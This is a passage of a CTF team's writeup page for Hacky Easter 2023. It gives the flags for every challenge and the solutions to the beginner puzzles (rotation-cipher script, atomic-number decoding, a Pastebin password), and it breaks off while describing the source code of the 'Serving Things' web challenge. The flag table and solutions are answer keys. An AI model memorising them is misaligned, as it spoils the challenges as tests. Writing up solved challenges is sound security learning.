<!doctype html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7"><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" ><meta name="generator" content="Jekyll v4.3.2" /><meta property="og:title" content="Hacky Easter 2023" /><meta property="og:locale" content="en" /><meta name="description" content="A set of CTF writeups by team Galaxians." /><meta property="og:description" content="A set of CTF writeups by team Galaxians." /><link rel="canonical" href="https://shiltemann.github.io/CTF-writeups-public/writeups/HackyEaster_2023/" /><meta property="og:url" content="https://shiltemann.github.io/CTF-writeups-public/writeups/HackyEaster_2023/" /><meta property="og:site_name" content="Galaxians CTF" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2023-04-01T00:00:00+02:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Hacky Easter 2023" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-04-01T00:00:00+02:00","datePublished":"2023-04-01T00:00:00+02:00","description":"A set of CTF writeups by team Galaxians.","headline":"Hacky Easter 2023","mainEntityOfPage":{"@type":"WebPage","@id":"https://shiltemann.github.io/CTF-writeups-public/writeups/HackyEaster_2023/"},"url":"https://shiltemann.github.io/CTF-writeups-public/writeups/HackyEaster_2023/"}</script><title> Galaxians CTF | Hacky Easter 2023</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Galaxians CTF"><meta name="application-name" content="Galaxians CTF"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.2.1/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.20.1/dist/tocbot.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.1/dist/jquery.min.js"></script><body data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/img/galaxians-logo.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title"> <a href="/">Galaxians CTF</a></div><div class="site-subtitle font-italic">Galactic Girlfiends Hack the Universe!</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>CTF EVENTS</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/posts/" class="nav-link"> <i class="fa-fw ml-xl-3 mr-xl-3 unloaded"></i> <span>POSTS</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/shiltemann" aria-label="github" target="_blank" rel="noopener noreferrer" > <i class="fab fa-github"></i> </a> <a href="https://twitter.com/" aria-label="twitter" target="_blank" rel="noopener noreferrer" > <i class="fab fa-twitter"></i> </a> <a href="javascript:location.href = 'mailto:' + ['galaxians','galaxians.org'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Hacky Easter 2023</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Ctf-event</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..." > </span> <span id="search-cancel">Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1> Hacky Easter 2023</h1><p>The annual Hacky Easter Event from Hacking-Lab</p><div class="post-content"><h1>Overview</h1><div class="table-wrapper"><div class="table-wrapper"><table><thead><tr><th>Challenge<th>Difficulty<th>Points<th>Category<th>Flag<tbody><tr style="background-color: rgba(99, 100, 100, 0.52);"><td colspan="5" style="font-weight: 900"> Level 1<tr><td><a href="#sanity-check">Sanity Check</a><td>noob<td>50<td>misc<td><code>he2023{just_A_sanity_chEck}</code><tr style="background-color: rgba(99, 100, 100, 0.52);"><td colspan="5" style="font-weight: 900"> Level 2<tr><td><a href="#word-cloud">Word Cloud</a><td>noob<td>50<td>misc<td><code>he2023{this_is_the_flag!}</code><tr><td><a href="#rotation">Rotation</a><td>noob<td>50<td>misc<td><code>he2023{0n3_c4n_r34d_r0t0r_b4ckw4rds}</code><tr><td><a href="#birds-on-a-wire">Birds on a Wire</a><td>noob<td>50<td>crypto<td><code>he2023{birdwatchingisfun}</code><tr><td><a href="#bins">Bins</a><td>noob<td>50<td>misc<td><code>he2023{s0rting_th3_w4ste}</code><tr style="background-color: rgba(99, 100, 100, 0.52);"><td colspan="5" style="font-weight: 900"> Level 3<tr><td><a href="#chemical-code">Chemical Code</a><td>easy<td>100<td>misc<td><code>he2023{flagenergyatomcosmos}</code><tr><td><a href="#serving-things">Serving Things</a><td>easy<td>100<td>web<td><code>he2023{4ls0-53rv3r-c4n-b3-1nj3ct3d!!!}</code><tr><td><a href="#cut-off">Cut Off</a><td>easy<td>100<td>misc<td><code>he2023{4cr0pa_wh4t?}</code><tr><td><a href="#global-egg-delivery">Global Egg Delivery</a><td>easy<td>100<td>misc<td><code>he2023{u7ƒ_b0m5s_8rᗱ_n07_8ㅣway5_1gn0rᗱd}</code><tr style="background-color: rgba(99, 100, 100, 0.52);"><td colspan="5" style="font-weight: 900"> Level 4<tr><td><a href="#flip-flop">Flip Flop</a><td>medium<td>200<td>web<td><code>he2023{1m4g3-tr4g1cK-aga111n}</code><tr><td><a href="#bouncy-not-in-the-castle">Bouncy not in the Castle</a><td>medium<td>200<td>web, forensics<td><code>he2023{n0_b0uNc}</code><tr><td><a href="#a-mysterious-parchment">A Mysterious Parchment</a><td>easy<td>100<td>misc<td><code>he2023{BUTISITACOOLOLDCODEITSUREIS}</code><tr><td><a href="#hamster">Hamster</a><td>easy<td>100<td>web<td><code>he2023{s1mpl3_h34d3r_t4mp3r1ng}</code><tr><td><a href="#lost-in-french-space">Lost in (French) Space</a><td>easy<td>100<td>osint<td><code>he2023{davies}</code><tr><td><a href="#spy-tricks">Spy Tricks</a><td>easy<td>100<td>crypto<td><code>he2023{I_like_303_b3tter_but_thats_n0t_pr1me}</code><tr style="background-color: rgba(99, 100, 100, 0.52);"><td colspan="5" style="font-weight: 900"> Level 5<tr><td><a href="#thumper-s-pwn-3">Thumper's PWN 3</a><td>medium<td>200<td>pwn<td><code>he2023{w3lc0m3_t0_r1ng_3_thump3r}</code><tr><td><a href="#ghost-in-a-shell">Ghost in a Shell</a><td>medium<td>200<td>forensics<td><code>he2023{al1asses-4-fUn-and-pr0fit}</code><tr><td><a href="#going-round">Going Round</a><td>medium<td>200<td>crypto<td><code>he2023{fl1p_n_r0t4t3_in_p4irs}</code><tr><td><a href="#number-s-station">Number's Station</a><td>medium<td>200<td>misc<td><code>he2023{L1stening_to_spy_c0mmunicat1ons}</code><tr><td><a href="#igor-s-gory-passwordsafe">Igor's Gory Passwordsafe</a><td>easy<td>100<td>web<td><code>he2023{1d0R_c4n_d3str0y_ur_Crypt0_3ff0rt}</code><tr><td><a href="#singular">Singular</a><td>easy<td>100<td>misc<td><code>he2023{security_first_easy_catch}</code><tr style="background-color: rgba(99, 100, 100, 0.52);"><td colspan="5" style="font-weight: 900"> Level 6<tr><td><a href="#crash-bash">Crash Bash</a><td>hard<td>300<td>pwn<td><code>he2023{gr34t_b4sh_succ3ss!}</code><tr><td><a href="#code-locked">Code Locked</a><td>medium<td>200<td>reversing, web<td><code>he2023{w3b4553m81y_15_FUN}</code><tr><td><a href="#quilt">Quilt</a><td>medium<td>200<td>misc<td><code>he2023{Qu1lt1ng_is_quit3_relaxing!}</code><tr><td><a href="#cats-in-the-bucket">Cats in the Bucket</a><td>medium<td>200<td>cloud<td><code>he2023{r013_assum3d_succ3ssfuLLy}</code><tr><td><a href="#tom-s-diary">Tom's Diary</a><td>medium<td>200<td>crypto<td><code>he2023{sl4sh3s_m4k3_m3_h4ppy}</code><tr style="background-color: rgba(99, 100, 100, 0.52);"><td colspan="5" style="font-weight: 900"> Level 7<tr><td><a href="#custom-keyboard">Custom Keyboard</a><td>hard<td>300<td>misc, reversing<td><code>he2023{leds_light_the_way}</code><tr><td><a href="#thumper-s-pwn-2">Thumper's PWN 2</a><td>hard<td>300<td>pwn<td> unsolved<tr><td><a href="#coney-island-hackers-2">Coney Island Hackers 2</a><td>medium<td>200<td>web<td><code>he2023{fun_w1th_ev1l_ev4l_1n_nyc}</code><tr><td><a href="#digital-snake-art">Digital Snake Art</a><td>medium<td>200<td>web<td><code>he2023{0n3_d03s_n0t_s1mply_s0lv3_th1s_chllng!}</code><tr><td><a href="#fruity-cipher">Fruity Cipher</a><td>medium<td>200<td>crypto<td><code>he2023{hypervitaminosis}</code><tr><td><a href="#kaos-motorn">Kaos Motorn</a><td>medium<td>200<td>misc<td><code>he2023{Th4tSKa0Z!}</code><tr style="background-color: rgba(99, 100, 100, 0.52);"><td colspan="5" style="font-weight: 900"> Level 8<tr><td><a href="#this-one-goes-to-11">This One Goes To 11</a><td>hard<td>300<td>reversing<td> unsolved<tr><td><a href="#thumper-s-pwn-1">Thumper's PWN 1</a><td>hard<td>300<td>pwn, reversing<td> unsolved<tr><td><a href="#jason">Jason</a><td>hard<td>300<td>misc<td><code>he2023{gr3pp1n_d4_js0n_l1k3_4_pr0!}</code><tr><td><a href="#the-little-rabbit">The Little Rabbit</a><td>hard<td>300<td>crypto<td><code>he2023{cr1b_dr4ggin_4_pr0fit!}</code></table></div></div><h1 id="sanity-check"> Sanity Check <a href="/writeups/HackyEaster_2023/level1-1-sanity-check.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>This is your first flag!</p><p>Right here –&gt; <code class="language-plaintext highlighter-rouge">he2023{ }</code></p><p>🚩 Flags are in format <code class="language-plaintext highlighter-rouge">he2023{...}</code>, unless noted otherwise. Always check additional information given (uppercase, lowercase, spaces, etc.).</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>The inner part of the flag is invisible, but inspecting the source for the empty-looking space gives us the hidden flag:</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nt">&lt;span</span> <span class="na">style=</span><span class="s">"color: black; background-color: black; opacity: 0;"</span><span class="nt">&gt;</span>just_A_sanity_chEck<span class="nt">&lt;/span&gt;</span>
</pre></table></code></div></div><h2> Flag</h2><code> he2023{just_A_sanity_chEck} </code><hr><h1 id="word-cloud"> Word Cloud <a href="/writeups/HackyEaster_2023/level2-1-word-cloud.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>I like Word Clouds, what about you?</p><p>Download the image below (he2023-wordcloud.jpg), sharpen your eyes, and find the right flag.</p><p><img src="./writeupfiles/he2023-wordcloud.jpg" alt="challenge image" /></p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>The wordcloud contains a lot of false flags, but also the correct one, so just read all the words until you find it!</p><p><img src="./writeupfiles/he2023-wordcloud-solution.jpg" alt="solution image" /></p><h2> Flag</h2><code> he2023{this_is_the_flag!} </code><hr><h1 id="rotation"> Rotation <a href="/writeups/HackyEaster_2023/level2-2-rotation.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>My new rotor messed up the flag!</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>96a_abL_?b04c?0Cbc50C_E_C03c4&lt;HcC5DN
</pre></table></code></div></div><p>I tried to decode it, but it didn’t work. The rotor must have been too fast!</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>We suspect a rotation cipher because of the cipher, and assuming the given string starts with <code class="language-plaintext highlighter-rouge">he2023</code>, this indeed checks out (<code class="language-plaintext highlighter-rouge">h</code> and <code class="language-plaintext highlighter-rouge">e</code> are 3 apart in the ASCII table, so are <code class="language-plaintext highlighter-rouge">9</code> and <code class="language-plaintext highlighter-rouge">6</code>). It would appear to be a rotation of 47, though sometimes it is +47, sometimes -47, so we write a short script to find the direction of rotation</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">string</span>

<span class="n">ct</span><span class="o">=</span><span class="sh">"</span><span class="s">96a_abL_?b04c?0Cbc50C_E_C03c4&lt;HcC5DN</span><span class="sh">"</span>
<span class="n">flag</span> <span class="o">=</span> <span class="sh">""</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nf">len</span><span class="p">(</span><span class="n">ct</span><span class="p">)):</span>
  <span class="n">pt</span> <span class="o">=</span> <span class="nf">chr </span><span class="p">(</span> <span class="nf">ord</span><span class="p">(</span><span class="n">ct</span><span class="p">[</span><span class="n">i</span><span class="p">])</span><span class="o">+</span><span class="mi">47</span> <span class="p">)</span>
  <span class="k">if</span> <span class="n">pt</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">string</span><span class="p">.</span><span class="n">printable</span><span class="p">:</span>
     <span class="n">pt</span> <span class="o">=</span> <span class="nf">chr </span><span class="p">(</span> <span class="nf">ord</span><span class="p">(</span><span class="n">ct</span><span class="p">[</span><span class="n">i</span><span class="p">])</span><span class="o">-</span><span class="mi">47</span> <span class="p">)</span>

  <span class="n">flag</span> <span class="o">+=</span> <span class="n">pt</span>

<span class="nf">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
</pre></table></code></div></div><p>which gives us the flag!</p><h2> Flag</h2><code> he2023{0n3_c4n_r34d_r0t0r_b4ckw4rds} </code><hr><h1 id="birds-on-a-wire"> Birds on a Wire <a href="/writeups/HackyEaster_2023/level2-3-birds-on-a-wire.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Just some birds sitting on a wire.</p><p>Download the image and find the flag!</p><p><img src="writeupfiles/birdsonawire.jpg" alt="" /></p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Some Googling reveals that this is the <a href="https://www.dcode.fr/birds-on-a-wire-cipher">“Birds on a Wire” cipher</a></p><p>It’s a simple substitution cipher so we just map the birds to their corresponding letters to find the flag!</p><h2> Flag</h2><code> he2023{birdwatchingisfun} </code><hr><h1 id="bins"> Bins <a href="/writeups/HackyEaster_2023/level2-4-bins.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>The rabbits left a mess in their cage.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>  //    //                    //
 ('&gt;   ('&gt;    LX2gkn81        ('&gt;
 /rr   /rr       carrots      /rr
*\))_ *\))_                  *\))_
</pre></table></code></div></div><p>If only I knew which bin to put the rubbish in.</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>This one took way too long, we first thought of anything in <code class="language-plaintext highlighter-rouge">/bin</code> folder we might use on this, then finally realized we did not get a file to download, are there any “bins” on the website or online? OMG <em>paste</em>bin!</p><p><a href="https://pastebin.com/LX2gkn81">pastebin.com/LX2gkn81</a></p><p>It exists, made just before the event, this is promising ..but it asks us for password, we try “carrots”, and boom, there is our flag!</p><h2> Flag</h2><code> he2023{s0rting_th3_w4ste} </code><hr><h1 id="chemical-code"> Chemical Code <a href="/writeups/HackyEaster_2023/level3-1-chemical-code.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Our crazy chemistry professor wrote a secret code on the blackboard:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>9 57 32 10 111 39 85 8 115 8 16 42 16
</pre></table></code></div></div><p>He also mumbled something like “essential and elementary knowledge”.</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>This sounds like we have to convert atomic numbers to their corresponding sybols to get the flag</p><p>We find a python package to help us, <a href="https://pyastronomy.readthedocs.io/en/latest/pyaslDoc/aslDoc/atomicNo.html,">PyAstronomy</a>and use it to decode the flag</p><pre><code class="language-python3">from PyAstronomy import pyasl

an = pyasl.AtomicNo()
ct =[9,57,32,10,111,39,85,8,115,8,16,42,16]

flag = "".join(an.getElSymbol(ct[i]) for i in range(0,len(ct)))

print(flag)  # outputs FLaGeNeRgYAtOMcOSMoS

</code></pre><h2> Flag</h2><code> he2023{flagenergyatomcosmos} </code><hr><h1 id="serving-things"> Serving Things <a href="/writeups/HackyEaster_2023/level3-2-serving-things.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Get the 🚩 at <code class="language-plaintext highlighter-rouge">/flag.</code></p><p><a href="[http://ch.hackyeaster.com:2316">http://ch.hackyeaster.com:2316</a></p><p>Note: The service is restarted every hour at x:00.</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>We get a simle website</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre><span class="cp">&lt;!DOCTYPE html&gt;</span>

<span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;head&gt;</span>
<span class="nt">&lt;title&gt;</span>Serving Things<span class="nt">&lt;/title&gt;</span>
    <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"stylesheet"</span>
	    <span class="na">href=</span><span class="s">"/static/app.css"</span><span class="nt">&gt;</span>
	<span class="nt">&lt;script	</span><span class="na">src=</span><span class="s">"/static/jquery-3.6.3.min.js"</span> <span class="na">language=</span><span class="s">"javascript"</span><span class="nt">&gt;&lt;/script&gt;</span>
    <span class="nt">&lt;script	</span><span class="na">src=</span><span class="s">"/static/app.js"</span> <span class="na">language=</span><span class="s">"javascript"</span><span class="nt">&gt;&lt;/script&gt;</span>
<span class="nt">&lt;/head&gt;</span>

<span class="nt">&lt;body&gt;</span>
	<span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"menu"</span><span class="nt">&gt;</span>
        Get: <span class="nt">&lt;a</span> <span class="na">id=</span><span class="s">"quotes"</span> <span class="na">href=</span><span class="s">"#"</span><span class="nt">&gt;</span>Quotes<span class="nt">&lt;/a&gt;</span> | <span class="nt">&lt;a</span> <span class="na">id=</span><span class="s">"colors"</span> <span class="na">href=</span><span class="s">"#"</span><span class="nt">&gt;</span>Colors<span class="nt">&lt;/a&gt;</span> | <span class="nt">&lt;a</span> <span class="na">id=</span><span class="s">"stars"</span> <span class="na">href=</span><span class="s">"#"</span><span class="nt">&gt;</span>Stars<span class="nt">&lt;/a&gt;</span> |
		<span class="nt">&lt;a</span> <span class="na">id=</span><span class="s">"cheese"</span> <span class="na">href=</span><span class="s">"#"</span><span class="nt">&gt;</span>Cheese<span class="nt">&lt;/a&gt;</span> | <span class="nt">&lt;a</span> <span class="na">id=</span><span class="s">"wine"</span> <span class="na">href=</span><span class="s">"#"</span><span class="nt">&gt;</span>Wine<span class="nt">&lt;/a&gt;</span> | <span class="nt">&lt;a</span> <span class="na">id=</span><span class="s">"meals"</span> <span class="na">href=</span><span class="s">"#"</span><span class="nt">&gt;</span>Swiss Meals<span class="nt">&lt;/a&gt;</span> |
		<span class="nt">&lt;a</span> <span class="na">id=</span><span class="s">"trek"</span> <span class="na">href=</span><span class="s">"#"</span><span class="nt">&gt;</span>The Trek<span class="nt">&lt;/a&gt;</span> | <span class="nt">&lt;a</span> <span class="na">id=</span><span class="s">"flag"</span> <span class="na">href=</span><span class="s">"#"</span><span class="nt">&gt;</span>Flag<span class="nt">&lt;/a&gt;</span>
	<span class="nt">&lt;/div&gt;</span>
	<span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"text"</span><span class="nt">&gt;</span>
	<span class="nt">&lt;/div&gt;</span>
	<span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"footer"</span><span class="nt">&gt;</span>
		<span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"created"</span><span class="nt">&gt;</span>
			Created by inik / 2023
		<span class="nt">&lt;/div&gt;</span>
	<span class="nt">&lt;/div&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</pre></table></code></div></div><p>with <code class="language-plaintext highlighter-rouge">app.js</code>:</p><div class="language-javascript highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
</pre><td class="rouge-code"><pre><span class="kd">function</span> <span class="nf">get</span><span class="p">(</span><span class="nx">url</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">u</span> <span class="o">=</span> <span class="nf">encodeURI</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">protocol</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">//</span><span class="dl">"</span> <span class="o">+</span> <span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">host</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">/get?url=</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">url</span><span class="p">);</span>
    <span class="nx">$</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="nx">u</span><span class="p">,</span> <span class="nf">function </span><span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
        <span class="kd">var</span> <span class="nx">color</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nf">floor</span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nf">random</span><span class="p">()</span> <span class="o">*</span> <span class="mi">16777215</span><span class="p">).</span><span class="nf">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">);</span>
        <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#text</span><span class="dl">"</span><span class="p">).</span><span class="nf">fadeOut</span><span class="p">(</span><span class="mi">400</span><span class="p">);</span>
        <span class="nf">setTimeout</span><span class="p">(</span><span class="nf">function </span><span class="p">()</span> <span class="p">{</span>
            <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#text</span><span class="dl">"</span><span class="p">).</span><span class="nf">html</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span>
            <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#text</span><span class="dl">"</span><span class="p">).</span><span class="nf">css</span><span class="p">(</span><span class="dl">"</span><span class="s2">color</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">#</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">color</span><span class="p">);</span>
            <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#text</span><span class="dl">"</span><span class="p">).</span><span class="nf">fadeIn</span><span class="p">(</span><span class="mi">400</span><span class="p">);</span>
        <span class="p">},</span> <span class="mi">400</span><span class="p">);</span>
    <span class="p">});</span>
<span class="p">}</span>

<span class="nf">$</span><span class="p">(</span><span class="nb">document</span><span class="p">).</span><span class="nf">ready</span><span class="p">(</span><span class="nf">function </span><span class="p">()</span> <span class="p">{</span>
    <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#quotes</span><span class="dl">"</span><span class="p">).</span><span class="nf">click</span><span class="p">(</span><span class="nf">function </span><span class="p">()</span> <span class="p">{</span>
        <span class="nf">get</span><span class="p">(</span><span class="dl">"</span><span class="s2">http://quotes:1337/quote</span><span class="dl">"</span><span class="p">);</span>
    <span class="p">})</span>

    <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#colors</span><span class="dl">"</span><span class="p">).</span><span class="nf">click</span><span class="p">(</span><span class="nf">function </span><span class="p">()</span> <span class="p">{</span>
        <span class="nf">get</span><span class="p">(</span><span class="dl">"</span><span class="s2">http://colors:1337/color</span><span class="dl">"</span><span class="p">);</span>
    <span class="p">})</span>

    <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#stars</span><span class="dl">"</span><span class="p">).</span><span class="nf">click</span><span class="p">(</span><span class="nf">function </span><span class="p">()</span> <span class="p">{</span>
